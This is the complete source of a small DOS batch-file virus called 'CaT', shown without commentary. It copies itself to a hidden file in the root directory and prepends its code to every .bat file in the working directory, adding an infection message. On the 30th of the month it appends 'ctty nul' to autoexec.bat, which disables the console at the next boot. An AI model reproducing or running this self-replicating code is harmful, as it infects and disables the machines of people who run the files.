@echo off>nul.CaT
  if '%1=='Inf goto CaTi
  if exist c:\!CaT.bat goto CaTs
  if not exist %0.bat goto CaTe
 find "CaT"<%0.bat>c:\!CaT.bat
 find "CaT" c:\autoexec.bat >nul
  if not errorlevel 1 goto CaTs
 echo.|date|find "30">nul.CaTs
  if errorlevel 1 goto CaTs
 echo echo CaT KillS YouR SysteM ... ;-> >>c:\Autoexec.bat
 echo ctty nul >>c:\autoexec.bat
:CaTs
 For %%a in (*.bat) do call c:\!CaT Inf %%a
 goto CaTe
:CaTi
 find "CaT"<%2>nul
  if not errorlevel 1 goto CaTe
 type c:\!CaT.bat>CaT.t
 echo echo CaT InFeCtEd YoUr SyStEm >>CaT.t
 type %2>>CaT.t
 move CaT.t %2>nul.CaT
 attrib c:\!CaT.bat +h +r +a 
:CaTe

